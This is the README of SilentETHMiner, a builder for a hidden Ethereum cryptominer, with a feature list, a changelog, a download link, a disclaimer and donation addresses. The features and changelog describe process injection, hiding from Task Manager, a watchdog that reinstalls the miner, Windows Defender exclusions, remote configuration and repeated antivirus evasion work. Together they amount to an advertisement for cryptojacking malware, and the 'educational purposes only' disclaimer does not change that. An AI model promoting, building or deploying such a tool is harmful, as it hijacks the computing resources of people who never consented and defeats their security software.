
<img src="https://github.com/UnamSanctam/SilentETHMiner/blob/master/SilentETHMiner.png?raw=true">

# SilentETHMiner v1.5 - Based on Lime Miner v0.3


## Main Features

* .NET - Coded in Visual Basic .NET, requires .NET Framework 4.5
 
* Codedom - No need for external libraries to compile

* Injection (Silent) - Hide payload behind another process

* Idle Mining - Can be configured to only mine when the computer isn't in use
  
* Stealth - Pauses the miner while Task Manager, Process Explorer or Process Hacker is open

* Watchdog - Replaces the miner if removed and starts it if closed down

* Ethash - Supports mining all Ethash coins like Ethereum, Ethereum Classic, Metaverse, Ellaism, QuarkChain and others

* Remote Configuration - Can get the connection and miner settings remotely from a URL, will get the configuration around every 60-90 minutes

* Bypass Windows Defender - Adds exclusions into Windows Defender for the general folders the miner uses

* Online Downloader - Can download the miner binary during runtime (from GitHub) to greatly decrease file size and detections

## Downloads

Pre-Compiled: https://github.com/UnamSanctam/SilentETHMiner/releases

## My Other Miners

[Silent XMR (Monero) Miner](https://github.com/UnamSanctam/SilentXMRMiner)

## Wiki

You can find the new wiki [here](https://github.com/UnamSanctam/SilentETHMiner/wiki) or at the top of the page.

## Requirements

When mining with the Ethash algorithm you need to have enough GPU memory left to store the DAG. So for example, mining Ethereum requires you to have at least a minimum GPU memory of 4.14 GB available since that is the size of the DAG as of writing this. Due to this, GPUs that have less available memory than the required DAG are not able to mine at all.
The other thing required is a recent enough CUDA or OpenCL compatible driver for your GPU.

So the requirements are as follow:
1. Enough GPU memory for the DAG
2. Supported drivers

## Changes

### v1.5 (05/07/2021)
**v1.5 is the final update before the new, greatly improved unified miner that I'm working on.**
* Added the Online Downloader option that makes the miner download the miner binary (from GitHub) during runtime to greatly decrease file size (to less then 100kb) and detections - Also added a cache so that it won't have to download the miner on every start
* Added the Stealth Targets option which allows you to enter which programs the Stealth option should pause for
* Added new options to 'Remote Configuration' that allows you to change some miner settings
* Now checks the 'Remote Configuration' settings around every 60-90 minutes
* Added {COMPUTERNAME}, {USERNAME} and {RANDOM} replacement strings support into 'Remote Configuration'
* Made the Task Scheduler task start for all users
* Fixed string that was triggering Windows Defender
* Improved Watchdog program flow
* Renamed "Kill" Windows Defender to Bypass Windows Defender to better represent the new functionality
* Updated miner and made it more stable
* Changed Remote Configuration formatting from INI to JSON
* Improved obfuscation/encryption
* Improved overall code
### v1.4.2 (14/05/2021)
* Made the Windows Defender Killer less intrusive, ironically to reduce detections
### v1.4.1 (13/05/2021)
* Made memory allocation yield to other processes more
* Decreased Watchdog detections
* Fixed possible Run as Administrator issue on computers with low privileges
### v1.4 (12/05/2021)
* Updated miner
* Added ETC toggle switch
* Fixed Etchash algorithm
* Updated Ethash algorithm
* Compiled miner and its dependencies statically so it no longer requires Visual C++
* Updated dependencies
* Updated OpenCL which should fix the new AMD drivers bug where it can't find it, also increases AMD hashrate
* Added Max GPU and Idle GPU options, although they will mostly just reduce fan sound since they won't decrease the VRAM required
* Added a Remote Configuration feature that can get the connection settings remotely from a URL at each startup
* Added option to auto-create an uninstaller for the miner
* Added Windows Defender "Killer"
* Added option to run as administrator
* Reworked whole program flow to bypass file scan detections
* Added link to wiki in builder for quicker access
* Added better DEBUG messaging
* Changed command line option prefixes
* Fixed bugs
### v1.3.3 (10/04/2021)
* Fixed watchdog temporary path
* Updated injector
* Readded injector options svchost.exe and conhost.exe
* Decreased injector detections
* Improved error handling
### v1.3.2 (09/04/2021)
* Fixed crash when some connections are blocked by the government/ISP in places like Turkey or China
### v1.3.1 (09/04/2021)
* Fixed minor injection option bug
### v1.3 (09/04/2021)
* Fixed critial bug on some Windows systems
* Added Task Scheduler startup when miner has administrator privileges
* Replaced and improved injector
* Added advanced options form
* Added debug option to display errors for testing
* Added ability to obfuscate watchdog
* Fixed miscellaneous bugs
### v1.2 (01/04/2021)
* Updated miner
* Added timer that reinitalizes GPU and memory every 30 minutes for better longevity during long mining sessions
* Recoded injector and watchdog from VB to C#
* Overall improved watchdog and injector
* Decreased antivirus detections
* Added built-in function name obfuscation
### v1.1 (28/03/2021)
* Improved miner
* Added compatability for RTX 3000 series cards among others
* Updated Watchdog
* Improved injector workflow reliability
* Changed encryption since the code was detected
### v1.0.2 (23/03/2021)
* Better support for running XMR miner and ETH miner simultaniously
* Changed encryption
### v1.0.1 (20/03/2021)
* Added support for proxy mining
### v1.0 (20/03/2021)
* Inital release

## Author

* **Unam Sanctam**
* Credit to **NYAN CAT** 


## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details

## Donate

XMR: 8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N

BTC: bc1q26uwkzv6rgsxqnlapkj908l68vl0j753r46wvq

ETH: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

ETC: 0xd513e80ECc106A1BA7Fa15F1C590Ef3c4cd16CF3

RVN: RFsUdiQJ31Zr1pKZmJ3fXqH6Gomtjd2cQe

CHAIN: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

DOGE: DNgFYHnZBVLw9FMdRYTQ7vD4X9w3AsWFRv

LTC: Lbr8RLB7wSaDSQtg8VEgfdqKoxqPq5Lkn3